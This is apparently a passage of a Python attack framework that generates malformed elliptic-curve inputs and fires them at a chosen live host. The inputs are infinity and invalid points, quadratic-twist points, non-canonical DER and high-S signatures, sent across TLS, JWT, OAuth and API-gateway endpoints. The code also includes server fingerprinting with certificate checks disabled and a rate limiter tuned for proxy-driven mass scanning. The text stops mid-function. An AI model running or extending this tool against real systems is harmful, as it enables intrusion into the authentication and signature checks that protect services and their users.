#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
A O E
"""

import asyncio
import struct
import json
import base64
import hashlib
import hmac
import secrets
import time
import logging
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from enum import IntEnum, Enum
from concurrent.futures import ThreadPoolExecutor
import binascii
import socket
import ssl
from datetime import datetime
import re
try:
    import fingerprint_proxy as fp_proxy
    FP_AVAILABLE = True
except Exception:
    FP_AVAILABLE = False

# Try to import cryptography libraries
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, ed25519, ed448, rsa, padding as asym_padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    # Logger may not be configured yet at import time
    print("[WARN] Cryptography library not available - some features will be limited")

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AsyncTokenBucket:
    """Simple asyncio token bucket rate limiter."""
    def __init__(self, rate_per_sec: float, capacity: int):
        self.rate_per_sec = float(rate_per_sec)
        self.capacity = int(capacity)
        self._tokens = float(capacity)
        self._last_refill = asyncio.get_event_loop().time()
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        async with self._lock:
            await self._refill()
            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return
            # Need to wait until at least one token is available
            needed = 1.0 - self._tokens
            wait_seconds = needed / self.rate_per_sec if self.rate_per_sec > 0 else 0.0
        # Release lock while sleeping to allow refills for others
        if wait_seconds > 0:
            await asyncio.sleep(wait_seconds)
        # Try again after sleep
        async with self._lock:
            await self._refill()
            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return
            # If still no tokens (very low rate), wait minimally
            await asyncio.sleep(max(0.0, 1.0 / self.rate_per_sec))

    async def _refill(self) -> None:
        now = asyncio.get_event_loop().time()
        elapsed = now - self._last_refill
        if elapsed <= 0:
            return
        self._tokens = min(self.capacity, self._tokens + elapsed * self.rate_per_sec)
        self._last_refill = now

class CurveType(Enum):
    """Elliptic Curve Types"""
    # NIST Prime Curves
    P256 = "secp256r1"
    P384 = "secp384r1" 
    P521 = "secp521r1"
    
    # Koblitz Curves
    SECP256K1 = "secp256k1"
    
    # Edwards Curves
    ED25519 = "ed25519"
    ED448 = "ed448"
    
    # Montgomery Curves
    CURVE25519 = "curve25519"
    CURVE448 = "curve448"
    
    # Brainpool Curves
    BP256 = "brainpoolP256r1"
    BP384 = "brainpoolP384r1"
    BP512 = "brainpoolP512r1"

class PointEncoding(IntEnum):
    """Point Encoding Formats"""
    UNCOMPRESSED = 0x04
    COMPRESSED_EVEN = 0x02
    COMPRESSED_ODD = 0x03
    HYBRID_EVEN = 0x06
    HYBRID_ODD = 0x07

class CoordinateSystem(Enum):
    """Coordinate System Types"""
    AFFINE = "affine"
    JACOBIAN = "jacobian"
    PROJECTIVE = "projective"
    LOPEZ_DAHAB = "lopez_dahab"
    MODIFIED_JACOBIAN = "modified_jacobian"

@dataclass
class CurveParameters:
    """Elliptic Curve Parameters"""
    name: str
    p: int  # Prime modulus
    a: int  # Curve parameter a (Weierstrass); Edwards uses a=-1; Montgomery uses A
    b: int  # Curve parameter b (Weierstrass); unused for Edwards/Montgomery here
    gx: int  # Generator point x (SEC1 for Weierstrass; X for Montgomery; Edwards x)
    gy: int  # Generator point y (Weierstrass/Edwards). Not used for Montgomery in this tool
    n: int  # Order of generator
    h: int  # Cofactor
    bit_size: int
    form: str = "weierstrass"  # One of: 'weierstrass', 'edwards', 'montgomery'
    
@dataclass
class ECPoint:
    """Elliptic Curve Point"""
    x: Optional[int]
    y: Optional[int]
    curve: CurveType
    encoding: PointEncoding = PointEncoding.UNCOMPRESSED
    is_infinity: bool = False
    
    def to_bytes(self, compressed: bool = False) -> bytes:
        """Convert point to byte representation"""
        if self.is_infinity:
            return b'\x00'
        
        if self.x is None or self.y is None:
            raise ValueError("Invalid point coordinates")
        
        curve_params = CURVE_REGISTRY[self.curve]
        byte_length = (curve_params.bit_size + 7) // 8
        
        x_bytes = self.x.to_bytes(byte_length, 'big')
        
        if compressed:
            # Compressed encoding
            prefix = PointEncoding.COMPRESSED_EVEN if (self.y % 2 == 0) else PointEncoding.COMPRESSED_ODD
            return bytes([prefix]) + x_bytes
        else:
            # Uncompressed encoding
            y_bytes = self.y.to_bytes(byte_length, 'big')
            return bytes([PointEncoding.UNCOMPRESSED]) + x_bytes + y_bytes

@dataclass
class AttackVector:
    """EC Attack Vector Definition"""
    name: str
    curve: CurveType
    anomaly_type: str
    description: str
    payload: bytes
    expected_behavior: str
    severity: str

@dataclass
class AttackResult:
    """EC Attack Result"""
    vector: str
    curve: str
    target_protocol: str
    target_endpoint: str
    success: bool = False
    vulnerability_detected: bool = False
    anomaly_accepted: bool = False
    response_status: Optional[int] = None
    response_data: bytes = b''
    error_message: Optional[str] = None
    processing_time_ms: float = 0.0
    evidence: List[str] = None
    library_fingerprint: Optional[str] = None
    
    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []

# Curve parameter definitions
CURVE_REGISTRY = {
    CurveType.P256: CurveParameters(
        name="secp256r1",
        p=0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff,
        a=0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc,
        b=0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b,
        gx=0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
        gy=0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5,
        n=0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551,
        h=1,
        bit_size=256,
        form="weierstrass"
    ),
    CurveType.P384: CurveParameters(
        name="secp384r1",
        p=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff,
        a=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc,
        b=0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef,
        gx=0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7,
        gy=0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f,
        n=0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973,
        h=1,
        bit_size=384,
        form="weierstrass"
    ),
    CurveType.P521: CurveParameters(
        name="secp521r1",
        p=0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,
        a=0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc,
        b=0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00,
        gx=0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66,
        gy=0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650,
        n=0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409,
        h=1,
        bit_size=521,
        form="weierstrass"
    ),
    CurveType.SECP256K1: CurveParameters(
        name="secp256k1",
        p=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f,
        a=0x0000000000000000000000000000000000000000000000000000000000000000,
        b=0x0000000000000000000000000000000000000000000000000000000000000007,
        gx=0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,
        gy=0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8,
        n=0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141,
        h=1,
        bit_size=256,
        form="weierstrass"
    ),
    # Edwards Curve: Ed25519 (Twisted Edwards form: -x^2 + y^2 = 1 + dx^2y^2)
    # Represent with field prime p and order n. We mark form='edwards'.
    CurveType.ED25519: CurveParameters(
        name="ed25519",
        p=0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed,
        a=-1,
        b=0,
        gx=0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a,
        gy=0x6666666666666666666666666666666666666666666666666666666666666658,
        n=0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed,
        h=8,
        bit_size=255,
        form="edwards"
    ),
    # Montgomery Curve: Curve25519 (y^2 = x^3 + 486662 x^2 + x)
    # We store A in 'a' and set form='montgomery'. Generator uses X coordinate only for ladder.
    CurveType.CURVE25519: CurveParameters(
        name="curve25519",
        p=0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed,
        a=486662,
        b=0,
        gx=9,
        gy=0,
        n=0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed,
        h=8,
        bit_size=255,
        form="montgomery"
    )
}

class EllipticCurveAOE:
    """Advanced Multi-Curve Elliptic Cryptography Attack Framework"""
    
    def __init__(self, target_host: str, target_port: int = 443, timeout: float = 10.0,
                 client_cert_path: Optional[str] = None, client_key_path: Optional[str] = None):
        """Initialize the EC AOE attack framework"""
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.client_cert_path = client_cert_path
        self.client_key_path = client_key_path
        self.attack_vectors = []
        self.discovered_endpoints = set()
        self.library_fingerprints = {}
        self.jwks = {}
        self.attack_stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'anomalies_accepted': 0,
            'libraries_fingerprinted': 0,
            'critical_vulnerabilities': 0
        }
        # Async rate limiter (token bucket) to bound request rate
        try:
            # 优化：提高速率限制，充分利用代理带宽
            self.rate_limiter = AsyncTokenBucket(rate_per_sec=50.0, capacity=100)  # 增加速率：30 -> 50
        except NameError:
            # Defined below; safe if __init__ runs before class definition at import time
            pass
        # 快速失败计数器
        self.endpoint_failures = {}  # endpoint -> failure_count
        self.max_endpoint_failures = 3  # 连续3次失败后跳过该endpoint
        # Limits now governed by rate limiter; no artificial vector slicing
        # Ensure optional curves are populated (Brainpool, etc.) if available via OpenSSL
        try:
            self._populate_brainpool_params_if_missing()
        except Exception as _:
            pass
        
        # Generate attack vectors for all supported curves
        self._generate_attack_vectors()
    
    def _generate_attack_vectors(self):
        """Generate comprehensive attack vectors for all curves"""
        logger.info("Generating multi-curve attack vectors...")
        
        for curve_type in CURVE_REGISTRY.keys():
            # Point-at-infinity attacks
            self.attack_vectors.extend(self._generate_infinity_attacks(curve_type))
            
            # Invalid point attacks  
            self.attack_vectors.extend(self._generate_invalid_point_attacks(curve_type))
            
            # DER encoding attacks
            self.attack_vectors.extend(self._generate_der_encoding_attacks(curve_type))
            
            # Compression bit attacks
            self.attack_vectors.extend(self._generate_compression_attacks(curve_type))
            
            # High-S signature attacks
            self.attack_vectors.extend(self._generate_high_s_attacks(curve_type))
            
            # Coordinate confusion attacks
            self.attack_vectors.extend(self._generate_coordinate_attacks(curve_type))
            
            # Curve twist attacks
            self.attack_vectors.extend(self._generate_twist_attacks(curve_type))
        
        logger.info(f"Generated {len(self.attack_vectors)} attack vectors across {len(CURVE_REGISTRY)} curves")
    
    def _select_representative_vectors(self) -> List[AttackVector]:
        """优化：选择3个最关键的攻击向量进行广度扫描，提高效率"""
        representative = []
        
        # 优化：只选择最关键的3个类别，减少广度扫描时间
        # infinity: 最基础的EC漏洞
        # invalid_point: 曲线验证问题
        # high_s: 签名验证问题
        target_categories = ['infinity', 'invalid_point', 'high_s']
        
        # 优化：优先使用最常见的曲线 P256
        primary_curve = CurveType.P256
        fallback_curves = [CurveType.SECP256K1, CurveType.P384]
        
        # 为每个类别选择一个向量
        for category in target_categories:
            # 首先尝试使用主曲线
            matching_vectors = [v for v in self.attack_vectors 
                              if category in v.name and v.curve == primary_curve]
            if matching_vectors:
                representative.append(matching_vectors[0])
                continue
            
            # 如果主曲线没有，尝试备选曲线
            for curve in fallback_curves:
                matching_vectors = [v for v in self.attack_vectors 
                                  if category in v.name and v.curve == curve]
                if matching_vectors:
                    representative.append(matching_vectors[0])
                    break
        
        logger.info(f"Selected {len(representative)} representative vectors: {[v.name for v in representative]}")
        return representative
    
    def _calculate_endpoint_anomaly_score(self, results: List[AttackResult]) -> float:
        """Calculate anomaly score for an endpoint based on attack results"""
        if not results:
            return 0.0
        
        score = 0.0
        total_results = len(results)
        
        # Factors that increase anomaly score:
        for result in results:
            # High processing time indicates potential computational issues
            if result.processing_time_ms > 5000:  # > 5 seconds
                score += 2.0
            elif result.processing_time_ms > 2000:  # > 2 seconds
                score += 1.0
            
            # Anomaly acceptance is a strong indicator
            if result.anomaly_accepted:
                score += 3.0
            
            # Vulnerability detection
            if result.vulnerability_detected:
                score += 4.0
            
            # Unexpected status codes
            if result.response_status in [500, 502, 503, 504]:
                score += 1.5
            
            # Success rate - too many failures might indicate filtering
            if not result.success:
                score += 0.5
        
        # Average the score
        normalized_score = score / total_results if total_results > 0 else 0.0
        
        return min(normalized_score, 10.0)  # Cap at 10.0
    
    def _generate_infinity_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate point-at-infinity attack vectors"""
        # Only applicable for Weierstrass SEC1 encodings
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_infinity_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"Infinity encoding attacks not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        
        # Different infinity point encodings
        infinity_encodings = [
            (b'\x00', "Standard infinity encoding"),
            (b'\x00\x00', "Extended infinity encoding"), 
            (b'\x04' + b'\x00' * 64, "Uncompressed zero point (P-256)"),
            (b'\x04' + b'\x00' * 96, "Uncompressed zero point (P-384)"),
            (b'\x04' + b'\x00' * 130, "Uncompressed zero point (P-521)"),
            (b'\x02' + b'\x00' * 32, "Compressed zero point"),
            (b'\x03' + b'\x00' * 32, "Compressed zero point (odd)"),
        ]
        
        curve_params = CURVE_REGISTRY[curve]
        byte_length = (curve_params.bit_size + 7) // 8
        
        for encoding, description in infinity_encodings:
            # Adjust encoding length for curve
            if len(encoding) > 1 and encoding[0] in [0x04]:
                # Uncompressed format - adjust for curve size
                if curve == CurveType.P256:
                    adjusted_encoding = b'\x04' + b'\x00' * 64
                elif curve == CurveType.P384:
                    adjusted_encoding = b'\x04' + b'\x00' * 96
                elif curve == CurveType.P521:
                    adjusted_encoding = b'\x04' + b'\x00' * 132
                else:
                    adjusted_encoding = b'\x04' + b'\x00' * (byte_length * 2)
            elif len(encoding) > 1 and encoding[0] in [0x02, 0x03]:
                # Compressed format
                adjusted_encoding = encoding[:1] + b'\x00' * byte_length
            else:
                adjusted_encoding = encoding
            
            vectors.append(AttackVector(
                name=f"infinity_{curve.value}_{len(encoding)}",
                curve=curve,
                anomaly_type="point_at_infinity",
                description=f"{description} for {curve.value}",
                payload=adjusted_encoding,
                expected_behavior="Should reject or handle gracefully",
                severity="MEDIUM"
            ))
        
        return vectors
    
    def _generate_invalid_point_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate invalid point attack vectors"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_invalid_point_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"Invalid SEC1 point attacks not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        curve_params = CURVE_REGISTRY[curve]
        byte_length = (curve_params.bit_size + 7) // 8
        
        # Points not on curve
        invalid_points = [
            # Point with x=0, y=1 (usually not on curve)
            (0, 1, "Zero x coordinate with non-zero y"),
            # Point with maximum x, y=0
            (curve_params.p - 1, 0, "Maximum x coordinate"),
            # Point with x=1, y=2 (check if on curve)
            (1, 2, "Small coordinate values"),
            # Large coordinates beyond curve prime
            (curve_params.p + 1, curve_params.p + 1, "Coordinates beyond curve prime"),
            # Negative coordinates (test modular reduction)
            (-1, -1, "Negative coordinates")
        ]
        
        for x, y, description in invalid_points:
            # Handle negative coordinates
            if x < 0:
                x = (x % curve_params.p)
            if y < 0:
                y = (y % curve_params.p)
            
            # Create uncompressed encoding
            try:
                x_bytes = x.to_bytes(byte_length, 'big')
                y_bytes = y.to_bytes(byte_length, 'big') 
                payload = bytes([PointEncoding.UNCOMPRESSED]) + x_bytes + y_bytes
                
                vectors.append(AttackVector(
                    name=f"invalid_point_{curve.value}_{x}_{y}",
                    curve=curve,
                    anomaly_type="invalid_point",
                    description=f"{description} for {curve.value}",
                    payload=payload,
                    expected_behavior="Should reject invalid point",
                    severity="HIGH"
                ))
            except OverflowError:
                # Skip if coordinates too large for encoding
                continue
        
        return vectors
    
    def _generate_der_encoding_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate non-canonical DER encoding attacks"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_der_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"DER encoding attacks not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        curve_params = CURVE_REGISTRY[curve]
        
        # Generate a valid point first
        valid_point = self._generate_valid_point(curve)
        if not valid_point:
            return vectors
        
        # DER encoding anomalies
        der_attacks = [
            ("leading_zeros", "Add unnecessary leading zeros"),
            ("negative_encoding", "Use negative integer encoding"),
            ("minimal_encoding", "Remove necessary leading zeros"),
            ("oversized_length", "Use oversized length encoding"),
            ("indefinite_length", "Use indefinite length encoding")
        ]
        
        for attack_type, description in der_attacks:
            try:
                malformed_der = self._create_malformed_der(valid_point, attack_type)
                
                vectors.append(AttackVector(
                    name=f"der_{attack_type}_{curve.value}",
                    curve=curve,
                    anomaly_type="der_encoding",
                    description=f"{description} for {curve.value}",
                    payload=malformed_der,
                    expected_behavior="Should reject non-canonical DER",
                    severity="HIGH"
                ))
            except Exception as e:
                logger.debug(f"Failed to create DER attack {attack_type} for {curve.value}: {e}")
        
        return vectors
    
    def _generate_compression_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate compression bit manipulation attacks"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_compression_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"SEC1 compression attacks not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        
        # Generate valid point
        valid_point = self._generate_valid_point(curve)
        if not valid_point:
            return vectors
        
        curve_params = CURVE_REGISTRY[curve]
        byte_length = (curve_params.bit_size + 7) // 8
        
        # Compression bit conflicts
        compression_attacks = [
            (PointEncoding.COMPRESSED_EVEN, "Force even compression on odd y"),
            (PointEncoding.COMPRESSED_ODD, "Force odd compression on even y"),
            (PointEncoding.HYBRID_EVEN, "Hybrid encoding with wrong parity"),
            (PointEncoding.HYBRID_ODD, "Hybrid encoding with wrong parity"),
        ]
        
        for encoding_type, description in compression_attacks:
            try:
                x_bytes = valid_point.x.to_bytes(byte_length, 'big')
                
                if encoding_type in [PointEncoding.HYBRID_EVEN, PointEncoding.HYBRID_ODD]:
                    # Hybrid encoding includes both x and y but with compression flag
                    y_bytes = valid_point.y.to_bytes(byte_length, 'big')
                    payload = bytes([encoding_type]) + x_bytes + y_bytes
                else:
                    # Compressed encoding with wrong parity
                    payload = bytes([encoding_type]) + x_bytes
                
                vectors.append(AttackVector(
                    name=f"compression_{encoding_type.name}_{curve.value}",
                    curve=curve,
                    anomaly_type="compression_conflict",
                    description=f"{description} for {curve.value}",
                    payload=payload,
                    expected_behavior="Should detect compression parity conflict",
                    severity="MEDIUM"
                ))
            except Exception as e:
                logger.debug(f"Failed to create compression attack for {curve.value}: {e}")
        
        return vectors
    
    def _generate_high_s_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate high-S signature malleability attacks"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_high_s_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"High-S signature tests not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        curve_params = CURVE_REGISTRY[curve]
        
        # High S values near curve order
        high_s_values = [
            curve_params.n - 1,  # Maximum valid S
            curve_params.n,      # Invalid S (equal to order) 
            curve_params.n + 1,  # Invalid S (beyond order)
            (curve_params.n * 3) // 4,  # High S value
        ]
        
        for s_value in high_s_values:
            try:
                # Create malformed signature with high S
                r_value = curve_params.n // 2  # Valid R value
                
                signature_payload = self._encode_ecdsa_signature(r_value, s_value, curve)
                
                vectors.append(AttackVector(
                    name=f"high_s_{hex(s_value)[-8:]}_{curve.value}",
                    curve=curve,
                    anomaly_type="high_s_signature",
                    description=f"High S value signature for {curve.value}",
                    payload=signature_payload,
                    expected_behavior="Should reject high S values (BIP 62)",
                    severity="HIGH"
                ))
            except Exception as e:
                logger.debug(f"Failed to create high-S attack for {curve.value}: {e}")
        
        return vectors
    
    def _generate_coordinate_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate coordinate system confusion attacks"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_coords_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"Coordinate confusion attacks not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        
        valid_point = self._generate_valid_point(curve)
        if not valid_point:
            return vectors
        
        # Different coordinate representations of same point
        coordinate_systems = [
            (CoordinateSystem.AFFINE, "Standard affine coordinates"),
            (CoordinateSystem.JACOBIAN, "Jacobian projective coordinates"),
            (CoordinateSystem.PROJECTIVE, "Standard projective coordinates"),
        ]
        
        for coord_system, description in coordinate_systems:
            try:
                coord_payload = self._convert_to_coordinate_system(valid_point, coord_system)
                
                vectors.append(AttackVector(
                    name=f"coord_{coord_system.value}_{curve.value}",
                    curve=curve,
                    anomaly_type="coordinate_confusion",
                    description=f"{description} for {curve.value}",
                    payload=coord_payload,
                    expected_behavior="Should normalize coordinates correctly",
                    severity="MEDIUM"
                ))
            except Exception as e:
                logger.debug(f"Failed to create coordinate attack for {curve.value}: {e}")
        
        return vectors
    
    def _generate_twist_attacks(self, curve: CurveType) -> List[AttackVector]:
        """Generate curve twist security attacks"""
        if CURVE_REGISTRY[curve].form != "weierstrass":
            return [
                AttackVector(
                    name=f"skip_twist_{curve.value}",
                    curve=curve,
                    anomaly_type="not_applicable",
                    description=f"Quadratic twist not applicable to {CURVE_REGISTRY[curve].form}",
                    payload=b"",
                    expected_behavior="N/A",
                    severity="LOW"
                )
            ]
        vectors = []
        curve_params = CURVE_REGISTRY[curve]
        
        # Points on quadratic twist of curve
        try:
            # Modify curve parameter b to create twist
            twist_b = (curve_params.b + 1) % curve_params.p
            
            # Find point on twisted curve using random x search
            max_trials = 2000
            for _ in range(max_trials):
                x = secrets.randbelow(curve_params.p - 1) + 1
                y_squared = (pow(x, 3, curve_params.p) + curve_params.a * x + twist_b) % curve_params.p
                y = self._tonelli_shanks(y_squared, curve_params.p)
                if y is not None:
                    twist_point = ECPoint(x=x, y=y, curve=curve)
                    payload = twist_point.to_bytes(compressed=False)
                    vectors.append(AttackVector(
                        name=f"twist_point_{x}_{curve.value}",
                        curve=curve,
                        anomaly_type="curve_twist",
                        description=f"Point on quadratic twist for {curve.value}",
                        payload=payload,
                        expected_behavior="Should reject points not on main curve",
                        severity="HIGH"
                    ))
                    break
        except Exception as e:
            logger.debug(f"Failed to generate twist attacks for {curve.value}: {e}")
        
        return vectors
    
    async def run_comprehensive_assessment(self, target_protocols: List[str] = None) -> Dict[str, Any]:
        """Run comprehensive EC vulnerability assessment"""
        if target_protocols is None:
            target_protocols = ['tls', 'jwt', 'api_gateway', 'mtls', 'oauth']
        
        logger.info(f"Starting comprehensive EC AOE assessment against {self.target_host}:{self.target_port}")
        logger.info(f"Testing {len(self.attack_vectors)} vectors across {len(target_protocols)} protocols")
        
        start_time = time.time()
        results = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': datetime.now().isoformat(),
            'curves_tested': [curve.value for curve in CURVE_REGISTRY.keys()],
            'protocols_tested': target_protocols,
            'attacks': {},
            'vulnerabilities': [],
            'library_fingerprints': {},
            'statistics': {},
            'metadata': {
                'tool_version': '5.0',
                'assessment_duration': 0,
                'total_vectors': len(self.attack_vectors),
                'vectors_per_curve': len(self.attack_vectors) // len(CURVE_REGISTRY)
            }
        }
        
        # Phase 1/4: Service Discovery and Protocol Detection
        logger.info("Phase 1/4: Service discovery and protocol detection...")
        discovery_result = await self.discover_ec_endpoints(target_protocols)
        results['attacks']['service_discovery'] = discovery_result
        
        # Phase 2/4: Library Fingerprinting
        logger.info("Phase 2/4: Cryptographic library fingerprinting...")
        fingerprint_result = await self.fingerprint_crypto_libraries()
        results['attacks']['library_fingerprinting'] = fingerprint_result
        results['library_fingerprints'] = self.library_fingerprints
        
        # Phase 3/4: Mass Vector Testing (主要耗时阶段)
        logger.info("Phase 3/4: Mass attack vector execution... (主要耗时阶段)")
        mass_testing_result = await self.execute_mass_vector_testing(target_protocols)
        results['attacks']['mass_testing'] = mass_testing_result
        
        # Phase 4/4: Protocol-Specific Attacks
        logger.info("Phase 4/4: Protocol-specific attack execution...")
        total_protocols = len(target_protocols)
        for i, protocol in enumerate(target_protocols, 1):
            logger.info(f"  Protocol-specific testing {i}/{total_protocols}: {protocol}...")
            protocol_result = await self.test_protocol_specific_vectors(protocol)
            results['attacks'][f'{protocol}_specific'] = protocol_result
        
        # (Removed) Advanced curve arithmetic attacks phase; no simulated results are reported
        
        # Compile results and generate comprehensive report
        results['metadata']['assessment_duration'] = time.time() - start_time
        results['statistics'] = self.compile_attack_statistics()
        self._analyze_vulnerabilities(results)
        
        return results
    
    async def discover_ec_endpoints(self, protocols: List[str]) -> Dict[str, Any]:
        """Discover elliptic curve endpoints across protocols"""
        results = {
            'discovered_endpoints': {},
            'protocol_support': {},
            'total_endpoints': 0
        }
        
        # Protocol-specific endpoint discovery
        discovery_tasks = []
        for protocol in protocols:
            discovery_tasks.append(self._discover_protocol_endpoints(protocol))
        
        protocol_results = await asyncio.gather(*discovery_tasks, return_exceptions=True)
        
        for protocol, result in zip(protocols, protocol_results):
            if not isinstance(result, Exception):
                results['discovered_endpoints'][protocol] = result.get('endpoints', [])
                results['protocol_support'][protocol] = result.get('supported', False)
                results['total_endpoints'] += len(result.get('endpoints', []))
                
                # Add to discovered endpoints set
                for endpoint in result.get('endpoints', []):
                    self.discovered_endpoints.add(endpoint)
        
        logger.info(f"Discovered {results['total_endpoints']} EC-enabled endpoints")
        return results
    
    async def fingerprint_crypto_libraries(self) -> Dict[str, Any]:
        """Collect concrete TLS and HTTP fingerprints: TLS version, cipher suite, cert info, server banners."""
        fingerprints: Dict[str, Any] = {
            'tls': {},
            'http': {},
        }
        # TLS fingerprint
        try:
            raw_sock = socket.create_connection((self.target_host, self.target_port), timeout=self.timeout)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(raw_sock, server_hostname=self.target_host) as ssock:
                tls_version = ssock.version()
                cipher = ssock.cipher()
                cert = ssock.getpeercert(binary_form=True)
                cert_sha256 = hashlib.sha256(cert).hexdigest() if cert else None
                fingerprints['tls'] = {
                    'version': tls_version,
                    'cipher': cipher[0] if cipher else None,
                    'cert_sha256': cert_sha256,
                }
        except Exception as e:
            fingerprints['tls'] = {'error': str(e)}
        # HTTP fingerprint (banner/server header)
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            loop = asyncio.get_event_loop()
            reader, writer = await asyncio.open_connection(self.target_host, self.target_port, ssl=context)
            req = f"HEAD / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n".encode()
            writer.write(req)
            await writer.drain()
            data = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
            writer.close()
            await writer.wait_closed()
            text = data.decode('utf-8', errors='ignore')
            server_header = None
            for line in text.splitlines():
                if line.lower().startswith('server:'):
                    server_header = line.split(':', 1)[1].strip()
                    break
            fingerprints['http'] = {
                'status': self._extract_http_status(text),
                'server': server_header,
            }
        except Exception as e:
            fingerprints['http'] = {'error': str(e)}
        self.library_fingerprints = fingerprints
        return {
            'fingerprinting_tests': [],
            'libraries_identified': fingerprints,
            'total_tests': 2
        }
    
    async def execute_mass_vector_testing(self, protocols: List[str]) -> Dict[str, Any]:
        """Execute layered mass testing: breadth-first with representative vectors, then depth for suspicious endpoints"""
        results = {
            'protocol_results': {},
            'total_tests': 0,
            'total_anomalies': 0,
            'vulnerabilities': [],
            'layered_strategy': {
                'phase1_breadth': {},
                'phase2_depth': {},
                'suspicious_endpoints': []
            }
        }
        
        # Select 5 representative attack vectors for breadth-first scanning
